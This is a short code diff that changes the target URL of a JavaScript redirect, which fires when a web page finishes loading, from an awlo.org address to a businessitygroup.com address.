@@ -3,7 +3,7 @@
   window.addEventListener(
     'load',
     () => {
-      window.location = 'https://awlo.org/awlc/'
+      window.location = 'https://businessitygroup.com/'
     },
     false
   )
